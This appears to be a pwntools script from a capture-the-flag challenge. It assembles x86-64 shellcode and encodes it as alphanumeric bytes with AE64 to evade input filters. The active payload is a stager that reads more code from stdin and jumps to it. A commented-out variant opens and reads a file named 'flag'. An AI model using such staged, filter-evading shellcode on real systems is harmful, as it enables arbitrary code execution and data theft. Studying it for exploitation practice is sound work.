from ae64 import AE64
from pwn import *

context.arch = "amd64"

# get bytes format shellcode
# shellcode = asm(
#     """
# push 3; pop rax;
# xor rdi, rdi;
# syscall;
# push 1734437990;
# mov rdi, rsp;
# xor rsi, rsi;
# push 2; pop rax;
# syscall;
# xor rdi, rdi;
# mov rsi, 0x20230000;
# mov rdx, 0x60;
# xor rax, rax; syscall;
# """
# )

shellcode = asm(
    """
    mov rsi, 0x20230130;
    xor r12, r12;
loop:
    xor rdi, rdi; push 1; pop rdx; inc rsi; xor rax, rax; syscall;
    inc r12;
    cmp r12, 0x800;
    jb loop;

    mov r13, 0x20230131;
    jmp r13;
"""
)

# get alphanumeric shellcode
# enc_shellcode = AE64().encode(shellcode)
enc_shellcode = AE64().encode(shellcode, "rax", 0xC, "small")
print(enc_shellcode.decode("latin-1"))
